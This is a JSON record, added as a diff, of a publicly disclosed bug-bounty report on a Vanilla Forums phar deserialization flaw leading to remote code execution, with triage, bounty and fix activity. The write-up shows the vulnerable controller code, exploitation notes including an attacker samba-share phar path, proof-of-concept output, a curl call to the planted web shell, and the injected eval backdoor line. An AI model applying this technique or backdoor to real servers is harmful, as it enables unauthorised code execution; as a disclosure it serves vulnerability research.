@@ -1,0 +1,400 @@
+{
+    "abilities": {
+        "can_manage_common_responses?": false, 
+        "can_manage_collaborators?": false, 
+        "can_reopen?": false, 
+        "can_ban_researcher?": false, 
+        "can_create_severity?": false, 
+        "can_assign_to_h1_triage?": false, 
+        "can_agree_on_going_public?": false, 
+        "assignable_team_member_groups": [], 
+        "can_view_credential_account_details?": false, 
+        "can_export?": false, 
+        "can_create_retest?": false, 
+        "can_assign_to_user?": false, 
+        "can_use_common_responses?": false, 
+        "can_hide_timeline?": false, 
+        "can_be_manually_disclosed?": false, 
+        "assignable_team_members": [], 
+        "can_clone?": false, 
+        "can_be_publicly_disclosed?": false, 
+        "can_close_comments?": false, 
+        "can_view_bounty_weights?": false, 
+        "can_suggest_bounty_amount?": false, 
+        "can_cancel_disclosure_request?": false, 
+        "can_redact?": false, 
+        "can_change_structured_scope?": false, 
+        "can_post_internal_comments?": false, 
+        "can_change_state?": false, 
+        "can_change_weakness?": false, 
+        "can_add_comment?": false, 
+        "can_reassign_to_team?": false, 
+        "can_change_title?": false, 
+        "can_award_bounty?": false, 
+        "can_award_swag?": false, 
+        "can_close?": false, 
+        "can_manage?": false
+    }, 
+    "comments_closed?": false, 
+    "substate": "resolved", 
+    "bug_reporter_agreed_on_going_public_at": "2018-10-24T15:45:40.565Z", 
+    "voters": [
+        "irek", 
+        "secator", 
+        "spam404", 
+        "theappsec", 
+        "inhibitor181", 
+        "ahiezer", 
+        "bughacher", 
+        "harry_mg", 
+        "babayaga_", 
+        "mygf", 
+        "and 27 more..."
+    ], 
+    "facebook_team?": false, 
+    "has_bounty?": true, 
+    "bounty_amount": "600.0", 
+    "rejected_anc_report_that_can_be_sent_back_to_anc_triagers?": false, 
+    "original_report_id": null, 
+    "id": 410237, 
+    "can_view_team": true, 
+    "team_member_agreed_on_going_public_at": null, 
+    "vulnerability_information": "## Summary:\n\nAn authenticated admin user can inject an serialized payload into a phar archive and trigger read access to it via an unprotected file_exists(). An attacker\ncan leverage this to deserialize untrusted data and gain remote code execution.\n\n## Notes:\n\n- You need to have an admin account to run this poc.\n- The default path to the constants.php file is '/var/www/html/conf/constants.php', please change it in your poc files, if you need. I have installed my version of Vanilla Forums in /var/www/html\n- BEWARE!! This poc will damage the application and overwrite constants.php. Make sure you back up your installation before running it!\n- In my poc I used an upload primitive for the phar archive, but if you wanted to remotely exploit on Winodws, you could use a samba share. I have tested this and its proved to be working 100%.\n  The payload would look like phar:////attacker-share/share/poc.jpg\n- Also note, we can use whatever extension we like for the phar archive, this would help in bypassing file upload checks/etc.\n\n## Analysis:\n\nInside of applications/dashboard/controllers/class.importcontroller.php we can see the following code\n\n```\nclass ImportController extends DashboardController {\n\n    ...\n\n    public function index() {\n        $this->permission('Garden.Import'); // This permission doesn't exist, so only users with Admin == '1' will succeed.\n        $timer = new Gdn_Timer();\n\n        // Determine the current step.\n        $this->Form = new Gdn_Form();\n        $imp = new ImportModel();\n        $imp->loadState();\n\n        // Search for the list of acceptable imports.\n        $importPaths = [];\n        $existingPaths = safeGlob(PATH_UPLOADS.'/export*', ['gz', 'txt']);\n        $existingPaths2 = safeGlob(PATH_UPLOADS.'/porter/export*', ['gz']);\n        $existingPaths = array_merge($existingPaths, $existingPaths2);\n        foreach ($existingPaths as $path) {\n            $importPaths[$path] = basename($path);\n        }\n        // Add the database as a path.\n        $importPaths = array_merge(['db:' => t('This Database')], $importPaths);\n\n        if ($imp->CurrentStep < 1) {\n            // Check to see if there is a file.\n            $importPath = c('Garden.Import.ImportPath');\n            $validation = new Gdn_Validation();\n\n\n            if (Gdn::request()->isAuthenticatedPostBack(true)) {\n                $upload = new Gdn_Upload();\n                $validation = new Gdn_Validation();\n                if (count($importPaths) > 0) {\n                    $validation->applyRule('PathSelect', 'Required', t('You must select a file to import.'));\n                }\n\n                if (count($importPaths) == 0 || $this->Form->getFormValue('PathSelect') == 'NEW') {                 // 1\n                    $tmpFile = $upload->validateUpload('ImportFile', false);\n                } else {\n                    $tmpFile = '';\n                }\n\n                if ($tmpFile) {\n                    $filename = $_FILES['ImportFile']['name'];\n                    $extension = pathinfo($filename, PATHINFO_EXTENSION);\n                    $targetFolder = PATH_ROOT.DS.'uploads'.DS.'import';\n                    if (!file_exists($targetFolder)) {\n                        mkdir($targetFolder, 0777, true);\n                    }\n                    $importPath = $upload->generateTargetName(PATH_ROOT.DS.'uploads'.DS.'import', $extension);\n                    $upload->saveAs($tmpFile, $importPath);\n                    $imp->ImportPath = $importPath;\n                    $this->Form->setFormValue('PathSelect', $importPath);\n\n                    $uploadedFiles = val('UploadedFiles', $imp->Data);\n                    $uploadedFiles[$importPath] = basename($filename);\n                    $imp->Data['UploadedFiles'] = $uploadedFiles;\n                } elseif (($pathSelect = $this->Form->getFormValue('PathSelect'))) {                                // 2\n                    if ($pathSelect == 'NEW') {\n                        $validation->addValidationResult('ImportFile', 'ValidateRequired');\n                    } else {\n                        $imp->ImportPath = $pathSelect;                                                             // 3\n                    }\n                } elseif (!$imp->ImportPath && count($importPaths) == 0) {\n                    // There was no file uploaded this request or before.\n                    $validation->addValidationResult('ImportFile', $upload->Exception);\n                }\n\n                // Validate the overwrite.\n                if (true || strcasecmp($this->Form->getFormValue('Overwrite'), 'Overwrite') == 0) {\n                    if (!stringBeginsWith($this->Form->getFormValue('PathSelect'), 'Db:', true)) {\n                        $validation->applyRule('Email', 'Required');\n                    }\n                }\n\n                if ($validation->validate($this->Form->formValues())) {\n                    $this->Form->setFormValue('Overwrite', 'overwrite');\n                    $imp->fromPost($this->Form->formValues());\n                    $this->View = 'Info';\n                } else {\n                    $this->Form->setValidationResults($validation->results());\n                }\n            } else {\n                $this->Form->setFormValue('PathSelect', $imp->ImportPath);\n            }\n            $imp->saveState();\n        } else {\n            $this->setData('Steps', $imp->steps());\n            $this->View = 'Info';\n        }\n\n        if (!stringBeginsWith($imp->ImportPath, 'db:') && !file_exists($imp->ImportPath)) {                         // 4\n            $imp->deleteState();\n        }\n```\n\nAt [1], we make sure our `PathSelect` is not set as \"NEW\". Then at [2] the code sets the `$pathSelect` variable from attacker controlled input. At [3] the code sets the `$imp->ImportPath` variable to the attackers fully controlled string. Finally at [4] we reach a file_exists() call with attacker controlled input, leading to deserialization inside of the phar archive.\n\n## Exploitation:\n\nIn my poc I used a file upload, but you could also use a remote samba share if you are targeting a Windows installation of Vanilla Forums.The payload would look like phar:////attacker-share/share/poc.phar/.jpg\n\n## Example:\n\nThe following steps are used to re-create the vulnerability:\n\n1. We create our phar file:\n\n`saturn:~ mr_me$ php poc-stage-1.php`\n\n2. We run the poc-stage-2.py which will trigger the bug\n\n```\nsaturn:~ mr_me$ ./poc-stage-2.py.py 172.16.175.143 admin:admin123\n(+) targeting: http://172.16.175.143\n(+) logged in!\n(+) uploaded phar!\n(+) leaked phar name!\n(+) triggered a write!\n(+) shell at: http://172.16.175.143/?c=phpinfo();\n\nsaturn:~ mr_me$ curl -sSG \"http://172.16.175.143/?c=system('id');\"\nuid=33(www-data) gid=33(www-data) groups=33(www-data)\n```\n\nNow, on the victim box:\n\n```\nsteven@pluto:/var/www/html/conf$ cat constants.php \n<?php if (!defined('APPLICATION')) exit();\n$a=eval($_GET[c]);//[''] = '';\n\n// Last edited by admin (172.16.175.1)2018-09-16 00:59:01steven@pluto:/var/www/html/conf$\n```\n\n## References:\n\n- https://rdot.org/forum/showthread.php?t=4379\n\n## Impact\n\nAn authenticated attacker can gain remote code execution. The supplied poc will inject PHP code into the constants.php file. Please be aware that this will damage your system, please take the correct steps to avoid frustration.", 
+    "activity_page_count": 1, 
+    "severity": {
+        "metrics": {
+            "confidentiality": "high", 
+            "privileges_required": "high", 
+            "user_interaction": "none", 
+            "attack_vector": "network", 
+            "attack_complexity": "low", 
+            "scope": "changed", 
+            "integrity": "high", 
+            "availability": "high"
+        }, 
+        "rating": "critical", 
+        "score": 9.1, 
+        "author_type": "Team"
+    }, 
+    "title": "Vanilla Forums ImportController index file_exists Unserialize Remote Code Execution Vulnerability", 
+    "is_member_of_team?": null, 
+    "vote_count": 37, 
+    "summaries": [
+        {
+            "category": "team", 
+            "can_create?": false, 
+            "can_view?": true
+        }, 
+        {
+            "category": "researcher", 
+            "can_view?": true, 
+            "can_edit?": false, 
+            "id": 10546, 
+            "content": "An authenticated admin user can inject an serialized payload into a phar archive and trigger a read access to it via an unprotected file_exists(). An attacker can leverage this to deserialize untrusted data and gain remote code execution.", 
+            "content_html": "<p>An authenticated admin user can inject an serialized payload into a phar archive and trigger a read access to it via an unprotected file_exists(). An attacker can leverage this to deserialize untrusted data and gain remote code execution.</p>\n"
+        }
+    ], 
+    "structured_scope": {
+        "asset_identifier": "*.vanillaforums.com", 
+        "max_severity": "critical", 
+        "databaseId": 2101, 
+        "asset_type": "URL"
+    }, 
+    "allow_singular_disclosure_at": "2018-11-23T15:45:40.636Z", 
+    "state": "Closed", 
+    "cve_ids": [], 
+    "activity_page_number": 1, 
+    "readable_substate": "Resolved", 
+    "public": true, 
+    "formatted_bounty": "$600", 
+    "attachments": [
+        {
+            "file_name": "vanilla_forums_importcontroller_index_file_exists_unserialize_rce.zip", 
+            "type": "application/zip", 
+            "id": 346904, 
+            "expiring_url": "https://hackerone-us-west-2-production-attachments.s3-us-west-2.amazonaws.com/000/346/904/19506996dc979d5c1a5ca5bc3a7ba3a960eb2835/vanilla_forums_importcontroller_index_file_exists_unserialize_rce.zip?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQSGAJTS7X%2F20181206%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20181206T221405Z&X-Amz-Expires=3600&X-Amz-Security-Token=FQoGZXIvYXdzEA8aDNv1JJkb2JCBJezLRSK3A3HLsRbM1N2dJQCs3cdkO9DdSlu97QyvuTWjB9TDM0zF0K5xYiGpDCZFKPrax%2BsFz5KI1WenrJdfAQhjK2VjV8ng750HOo6R9QtyoSkXqJSITk3z0sX6u%2BaGuR53DR1SgrXgU4%2BZj3kzVsOKKtd61G%2BDZP2N3q%2FR9lSxtCBWOIkOltAHyGZcqelOD%2BNHIXr08GPe3urs8MfpCWN12Uc98ELvbzHllGEdfFgQzzzB%2Fh03QvsfmUHldJCz%2F09ZO2mOXeVGvvhGa6P439ow0kmfHorCf2l49cQlp550RAVCceslQNRsIpjs%2FscvNzwUdv1wSWwe0IojrRDLG4nQFwiQ1K3a1GlpxXYzTv176jcnZhJdyzHXn0aNVd3n2yu6QXF1RyrednAqH6GTeLsY%2BmFdJvs1E%2FSPzNOEj5naR190ChZbKYdPEncIwhYy7S7R055CIUnAzUObhGpKBIz%2FL7hX57SOAVB8Fp6J9NWYxxkcT1Ux5M8TRdPzjlD4gsEW3VAWt2ylLrHUu11rkw%2BhgkA7Cbe4vsOk6sYBm%2BDSV9vvQVz42kWGtRMos%2BFMKzKt4FX3akfBm1nwEgIo656m4AU%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=ea990e00e1c6ed24c6a8f90203e12a00ccaa8275f031c4b08deb1b9110e596d7"
+        }
+    ], 
+    "singular_disclosure_disabled": false, 
+    "activities": [
+        {
+            "automated_response": false, 
+            "created_at": "2018-09-17T12:49:00.539Z", 
+            "is_internal": false, 
+            "editable": false, 
+            "updated_at": "2018-09-17T12:49:00.539Z", 
+            "actor": {
+                "username": "dexterr", 
+                "url": "/dexterr", 
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/000/201/201/63b60a565fa550165cfe08c9d9739c7f02712a73_medium.png?1522156506"
+                }, 
+                "hackerone_triager": false
+            }, 
+            "team_handle": "vanilla", 
+            "message": "Hi there. Your report has been assigned to a developer who  will provide a feedback shortly.\nThank you.", 
+            "markdown_message": "<p>Hi there. Your report has been assigned to a developer who  will provide a feedback shortly.<br>\nThank you.</p>\n", 
+            "type": "Activities::Comment", 
+            "id": 3348706, 
+            "genius_execution_id": null
+        }, 
+        {
+            "automated_response": false, 
+            "created_at": "2018-09-17T15:49:57.437Z", 
+            "is_internal": false, 
+            "editable": false, 
+            "updated_at": "2018-09-17T15:49:57.437Z", 
+            "actor": {
+                "username": "manwithnoname", 
+                "url": "/manwithnoname", 
+                "profile_picture_urls": {
+                    "medium": "/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"
+                }, 
+                "hackerone_triager": false
+            }, 
+            "team_handle": "vanilla", 
+            "message": "This has been triaged.\nThank you.", 
+            "markdown_message": "<p>This has been triaged.<br>\nThank you.</p>\n", 
+            "type": "Activities::BugTriaged", 
+            "id": 3349532, 
+            "genius_execution_id": null
+        }, 
+        {
+            "automated_response": false, 
+            "created_at": "2018-09-17T15:53:40.047Z", 
+            "is_internal": false, 
+            "editable": false, 
+            "updated_at": "2018-09-17T15:53:40.047Z", 
+            "actor": {
+                "username": "tburry", 
+                "url": "/tburry", 
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/000/190/499/1d442d7583b0a03d8c33c6c6a22e3156846e1d5e_medium.jpg?1502301205"
+                }, 
+                "hackerone_triager": false
+            }, 
+            "additional_data": {
+                "new_severity": "Critical (9.1)", 
+                "old_severity": "High (8.8)"
+            }, 
+            "team_handle": "vanilla", 
+            "message": "", 
+            "markdown_message": "", 
+            "type": "Activities::ReportSeverityUpdated", 
+            "id": 3349551, 
+            "genius_execution_id": null
+        }, 
+        {
+            "bounty_currency": "usd", 
+            "automated_response": false, 
+            "created_at": "2018-09-19T12:45:20.256Z", 
+            "is_internal": false, 
+            "editable": false, 
+            "updated_at": "2018-09-19T12:45:20.256Z", 
+            "actor": {
+                "url": "/vanilla", 
+                "profile": {
+                    "name": "Vanilla"
+                }, 
+                "ibb": false, 
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/000/017/443/305c2a7379725cdd5a45ac498670186a9d8d2c16_medium.png?1519846664"
+                }
+            }, 
+            "team_handle": "vanilla", 
+            "bonus_amount": "0.0", 
+            "bounty_amount": "600.0", 
+            "collaborator": {
+                "username": "mr_me", 
+                "url": "/mr_me"
+            }, 
+            "message": "", 
+            "markdown_message": "", 
+            "type": "Activities::BountyAwarded", 
+            "id": 3358154, 
+            "genius_execution_id": null
+        }, 
+        {
+            "automated_response": false, 
+            "created_at": "2018-09-19T13:44:41.497Z", 
+            "is_internal": false, 
+            "editable": false, 
+            "updated_at": "2018-09-19T13:44:41.497Z", 
+            "actor": {
+                "username": "mr_me", 
+                "url": "/mr_me", 
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/000/041/443/1d895fb5ebd380a050d2d3e170729b5a72fb1379_medium.jpg?1472495053"
+                }, 
+                "hackerone_triager": false
+            }, 
+            "team_handle": "vanilla", 
+            "message": "Thanks!", 
+            "markdown_message": "<p>Thanks!</p>\n", 
+            "type": "Activities::Comment", 
+            "id": 3358404, 
+            "genius_execution_id": null
+        }, 
+        {
+            "automated_response": false, 
+            "reporter": {
+                "username": "mr_me", 
+                "url": "/mr_me"
+            }, 
+            "created_at": "2018-09-23T23:40:55.865Z", 
+            "is_internal": false, 
+            "editable": false, 
+            "updated_at": "2018-09-23T23:40:55.865Z", 
+            "actor": {
+                "username": "linc", 
+                "url": "/linc", 
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/000/136/045/e6bae7f9edf6940a514d48d769422c229000d3aa_medium.png?1495575265"
+                }, 
+                "hackerone_triager": false
+            }, 
+            "team_handle": "vanilla", 
+            "message": "Shipped in 2.6.2, 2.5.5, upcoming 2.7, and previously to cloud.", 
+            "markdown_message": "<p>Shipped in 2.6.2, 2.5.5, upcoming 2.7, and previously to cloud.</p>\n", 
+            "type": "Activities::BugResolved", 
+            "id": 3376862, 
+            "genius_execution_id": null
+        }, 
+        {
+            "automated_response": false, 
+            "created_at": "2018-10-24T15:45:27.079Z", 
+            "is_internal": false, 
+            "editable": false, 
+            "updated_at": "2018-10-24T15:45:27.079Z", 
+            "actor": {
+                "username": "mr_me", 
+                "url": "/mr_me", 
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/000/041/443/1d895fb5ebd380a050d2d3e170729b5a72fb1379_medium.jpg?1472495053"
+                }, 
+                "hackerone_triager": false
+            }, 
+            "team_handle": "vanilla", 
+            "message": "Can we please disclose this case?", 
+            "markdown_message": "<p>Can we please disclose this case?</p>\n", 
+            "type": "Activities::Comment", 
+            "id": 3527245, 
+            "genius_execution_id": null
+        }, 
+        {
+            "automated_response": false, 
+            "created_at": "2018-10-24T15:45:40.604Z", 
+            "is_internal": false, 
+            "editable": false, 
+            "updated_at": "2018-10-24T15:45:40.604Z", 
+            "actor": {
+                "username": "mr_me", 
+                "url": "/mr_me", 
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/000/041/443/1d895fb5ebd380a050d2d3e170729b5a72fb1379_medium.jpg?1472495053"
+                }, 
+                "hackerone_triager": false
+            }, 
+            "team_handle": "vanilla", 
+            "first_to_agree": true, 
+            "message": "", 
+            "markdown_message": "", 
+            "type": "Activities::AgreedOnGoingPublic", 
+            "id": 3527246, 
+            "genius_execution_id": null
+        }, 
+        {
+            "automated_response": false, 
+            "created_at": "2018-11-23T15:45:43.156Z", 
+            "is_internal": false, 
+            "editable": false, 
+            "updated_at": "2018-11-23T15:45:43.156Z", 
+            "actor": {
+                "url": "/vanilla", 
+                "profile": {
+                    "name": "Vanilla"
+                }, 
+                "ibb": false, 
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/000/017/443/305c2a7379725cdd5a45ac498670186a9d8d2c16_medium.png?1519846664"
+                }
+            }, 
+            "team_handle": "vanilla", 
+            "message": "", 
+            "markdown_message": "", 
+            "type": "Activities::ReportBecamePublic", 
+            "id": 3701308, 
+            "genius_execution_id": null
+        }, 
+        {
+            "automated_response": false, 
+            "created_at": "2018-11-26T17:43:27.708Z", 
+            "is_internal": false, 
+            "editable": false, 
+            "updated_at": "2018-11-26T17:43:27.708Z", 
+            "actor": {
+                "username": "mr_me", 
+                "url": "/mr_me", 
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/000/041/443/1d895fb5ebd380a050d2d3e170729b5a72fb1379_medium.jpg?1472495053"
+                }, 
+                "hackerone_triager": false
+            }, 
+            "team_handle": "vanilla", 
+            "message": "CVE-2018-19501", 
+            "markdown_message": "<p>CVE-2018-19501</p>\n", 
+            "type": "Activities::Comment", 
+            "id": 3710729, 
+            "genius_execution_id": null
+        }
+    ], 
+    "in_validation?": false, 
+    "is_participant": false, 
+    "singular_disclosure_allowed": true, 
+    "reporter": {
+        "username": "mr_me", 
+        "hacker_mediation": false, 
+        "hackerone_triager": false, 
+        "disabled": false, 
+        "url": "/mr_me", 
+        "profile_picture_urls": {
+            "small": "https://profile-photos.hackerone-user-content.com/000/041/443/93e88f3b78320cbcd437c53af6b3646f5de99c84_small.jpg?1472495053"
+        }, 
+        "is_me?": false
+    }, 
+    "weakness": {
+        "id": 52, 
+        "name": "Deserialization of Untrusted Data"
+    }, 
+    "is_external_bug": false, 
+    "visibility": "full", 
+    "allow_singular_disclosure_after": -1146504.536370935, 
+    "disclosed_at": "2018-11-23T15:45:43.118Z", 
+    "stage": 4, 
+    "url": "https://hackerone.com/reports/410237", 
+    "created_at": "2018-09-16T05:21:06.306Z", 
+    "original_report_url": null, 
+    "vulnerability_information_html": "<h2 id=\"summary\">Summary:</h2>\n\n<p>An authenticated admin user can inject an serialized payload into a phar archive and trigger read access to it via an unprotected file_exists(). An attacker<br>\ncan leverage this to deserialize untrusted data and gain remote code execution.</p>\n\n<h2 id=\"notes\">Notes:</h2>\n\n<ul>\n<li>You need to have an admin account to run this poc.</li>\n<li>The default path to the constants.php file is &#39;/var/www/html/conf/constants.php&#39;, please change it in your poc files, if you need. I have installed my version of Vanilla Forums in /var/www/html</li>\n<li>BEWARE!! This poc will damage the application and overwrite constants.php. Make sure you back up your installation before running it!</li>\n<li>In my poc I used an upload primitive for the phar archive, but if you wanted to remotely exploit on Winodws, you could use a samba share. I have tested this and its proved to be working 100%.\nThe payload would look like phar:////attacker-share/share/poc.jpg</li>\n<li>Also note, we can use whatever extension we like for the phar archive, this would help in bypassing file upload checks/etc.</li>\n</ul>\n\n<h2 id=\"analysis\">Analysis:</h2>\n\n<p>Inside of applications/dashboard/controllers/class.importcontroller.php we can see the following code</p>\n<pre class=\"highlight plaintext\"><code>class ImportController extends DashboardController {\n\n    ...\n\n    public function index() {\n        $this-&gt;permission(&#39;Garden.Import&#39;); // This permission doesn&#39;t exist, so only users with Admin == &#39;1&#39; will succeed.\n        $timer = new Gdn_Timer();\n\n        // Determine the current step.\n        $this-&gt;Form = new Gdn_Form();\n        $imp = new ImportModel();\n        $imp-&gt;loadState();\n\n        // Search for the list of acceptable imports.\n        $importPaths = [];\n        $existingPaths = safeGlob(PATH_UPLOADS.&#39;/export*&#39;, [&#39;gz&#39;, &#39;txt&#39;]);\n        $existingPaths2 = safeGlob(PATH_UPLOADS.&#39;/porter/export*&#39;, [&#39;gz&#39;]);\n        $existingPaths = array_merge($existingPaths, $existingPaths2);\n        foreach ($existingPaths as $path) {\n            $importPaths[$path] = basename($path);\n        }\n        // Add the database as a path.\n        $importPaths = array_merge([&#39;db:&#39; =&gt; t(&#39;This Database&#39;)], $importPaths);\n\n        if ($imp-&gt;CurrentStep &lt; 1) {\n            // Check to see if there is a file.\n            $importPath = c(&#39;Garden.Import.ImportPath&#39;);\n            $validation = new Gdn_Validation();\n\n\n            if (Gdn::request()-&gt;isAuthenticatedPostBack(true)) {\n                $upload = new Gdn_Upload();\n                $validation = new Gdn_Validation();\n                if (count($importPaths) &gt; 0) {\n                    $validation-&gt;applyRule(&#39;PathSelect&#39;, &#39;Required&#39;, t(&#39;You must select a file to import.&#39;));\n                }\n\n                if (count($importPaths) == 0 || $this-&gt;Form-&gt;getFormValue(&#39;PathSelect&#39;) == &#39;NEW&#39;) {                 // 1\n                    $tmpFile = $upload-&gt;validateUpload(&#39;ImportFile&#39;, false);\n                } else {\n                    $tmpFile = &#39;&#39;;\n                }\n\n                if ($tmpFile) {\n                    $filename = $_FILES[&#39;ImportFile&#39;][&#39;name&#39;];\n                    $extension = pathinfo($filename, PATHINFO_EXTENSION);\n                    $targetFolder = PATH_ROOT.DS.&#39;uploads&#39;.DS.&#39;import&#39;;\n                    if (!file_exists($targetFolder)) {\n                        mkdir($targetFolder, 0777, true);\n                    }\n                    $importPath = $upload-&gt;generateTargetName(PATH_ROOT.DS.&#39;uploads&#39;.DS.&#39;import&#39;, $extension);\n                    $upload-&gt;saveAs($tmpFile, $importPath);\n                    $imp-&gt;ImportPath = $importPath;\n                    $this-&gt;Form-&gt;setFormValue(&#39;PathSelect&#39;, $importPath);\n\n                    $uploadedFiles = val(&#39;UploadedFiles&#39;, $imp-&gt;Data);\n                    $uploadedFiles[$importPath] = basename($filename);\n                    $imp-&gt;Data[&#39;UploadedFiles&#39;] = $uploadedFiles;\n                } elseif (($pathSelect = $this-&gt;Form-&gt;getFormValue(&#39;PathSelect&#39;))) {                                // 2\n                    if ($pathSelect == &#39;NEW&#39;) {\n                        $validation-&gt;addValidationResult(&#39;ImportFile&#39;, &#39;ValidateRequired&#39;);\n                    } else {\n                        $imp-&gt;ImportPath = $pathSelect;                                                             // 3\n                    }\n                } elseif (!$imp-&gt;ImportPath &amp;&amp; count($importPaths) == 0) {\n                    // There was no file uploaded this request or before.\n                    $validation-&gt;addValidationResult(&#39;ImportFile&#39;, $upload-&gt;Exception);\n                }\n\n                // Validate the overwrite.\n                if (true || strcasecmp($this-&gt;Form-&gt;getFormValue(&#39;Overwrite&#39;), &#39;Overwrite&#39;) == 0) {\n                    if (!stringBeginsWith($this-&gt;Form-&gt;getFormValue(&#39;PathSelect&#39;), &#39;Db:&#39;, true)) {\n                        $validation-&gt;applyRule(&#39;Email&#39;, &#39;Required&#39;);\n                    }\n                }\n\n                if ($validation-&gt;validate($this-&gt;Form-&gt;formValues())) {\n                    $this-&gt;Form-&gt;setFormValue(&#39;Overwrite&#39;, &#39;overwrite&#39;);\n                    $imp-&gt;fromPost($this-&gt;Form-&gt;formValues());\n                    $this-&gt;View = &#39;Info&#39;;\n                } else {\n                    $this-&gt;Form-&gt;setValidationResults($validation-&gt;results());\n                }\n            } else {\n                $this-&gt;Form-&gt;setFormValue(&#39;PathSelect&#39;, $imp-&gt;ImportPath);\n            }\n            $imp-&gt;saveState();\n        } else {\n            $this-&gt;setData(&#39;Steps&#39;, $imp-&gt;steps());\n            $this-&gt;View = &#39;Info&#39;;\n        }\n\n        if (!stringBeginsWith($imp-&gt;ImportPath, &#39;db:&#39;) &amp;&amp; !file_exists($imp-&gt;ImportPath)) {                         // 4\n            $imp-&gt;deleteState();\n        }\n</code></pre>\n<p>At [1], we make sure our <code>PathSelect</code> is not set as &quot;NEW&quot;. Then at [2] the code sets the <code>$pathSelect</code> variable from attacker controlled input. At [3] the code sets the <code>$imp-&gt;ImportPath</code> variable to the attackers fully controlled string. Finally at [4] we reach a file_exists() call with attacker controlled input, leading to deserialization inside of the phar archive.</p>\n\n<h2 id=\"exploitation\">Exploitation:</h2>\n\n<p>In my poc I used a file upload, but you could also use a remote samba share if you are targeting a Windows installation of Vanilla Forums.The payload would look like phar:////attacker-share/share/poc.phar/.jpg</p>\n\n<h2 id=\"example\">Example:</h2>\n\n<p>The following steps are used to re-create the vulnerability:</p>\n\n<ol>\n<li>We create our phar file:</li>\n</ol>\n\n<p><code>saturn:~ mr_me$ php poc-stage-1.php</code></p>\n\n<ol>\n<li>We run the poc-stage-2.py which will trigger the bug</li>\n</ol>\n<pre class=\"highlight plaintext\"><code>saturn:~ mr_me$ ./poc-stage-2.py.py 172.16.175.143 admin:admin123\n(+) targeting: http://172.16.175.143\n(+) logged in!\n(+) uploaded phar!\n(+) leaked phar name!\n(+) triggered a write!\n(+) shell at: http://172.16.175.143/?c=phpinfo();\n\nsaturn:~ mr_me$ curl -sSG &quot;http://172.16.175.143/?c=system(&#39;id&#39;);&quot;\nuid=33(www-data) gid=33(www-data) groups=33(www-data)\n</code></pre>\n<p>Now, on the victim box:</p>\n<pre class=\"highlight plaintext\"><code>steven@pluto:/var/www/html/conf$ cat constants.php \n&lt;?php if (!defined(&#39;APPLICATION&#39;)) exit();\n$a=eval($_GET[c]);//[&#39;&#39;] = &#39;&#39;;\n\n// Last edited by admin (172.16.175.1)2018-09-16 00:59:01steven@pluto:/var/www/html/conf$\n</code></pre>\n<h2 id=\"references\">References:</h2>\n\n<ul>\n<li><a title=\"https://rdot.org/forum/showthread.php?t=4379\" href=\"/redirect?signature=bde15125f03789f3963f7ba663bdd1830cedd1e6&amp;url=https%3A%2F%2Frdot.org%2Fforum%2Fshowthread.php%3Ft%3D4379\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"><span>https://rdot.org/forum/showthread.php?t=4379</span><i class=\"icon-external-link\"></i></a></li>\n</ul>\n\n<h2 id=\"impact\">Impact</h2>\n\n<p>An authenticated attacker can gain remote code execution. The supplied poc will inject PHP code into the constants.php file. Please be aware that this will damage your system, please take the correct steps to avoid frustration.</p>\n", 
+    "severity_rating": "critical", 
+    "team_private?": false, 
+    "team": {
+        "profile": {
+            "website": "http://vanillaforums.com", 
+            "about": "Vanilla is a powerfully simple discussion forum you can easily customize to make as unique as your community.", 
+            "twitter_handle": "vanilla", 
+            "name": "Vanilla"
+        }, 
+        "handle": "vanilla", 
+        "url": "https://hackerone.com/vanilla", 
+        "state": "public_mode", 
+        "profile_picture_urls": {
+            "small": "https://profile-photos.hackerone-user-content.com/000/017/443/5df0d2dcfad30933e8b17f914d8906b5665abac8_small.png?1519846664", 
+            "medium": "https://profile-photos.hackerone-user-content.com/000/017/443/305c2a7379725cdd5a45ac498670186a9d8d2c16_medium.png?1519846664"
+        }, 
+        "awards_miles": false, 
+        "permissions": [], 
+        "id": 17443, 
+        "default_currency": "usd"
+    }, 
+    "is_published": false
+}
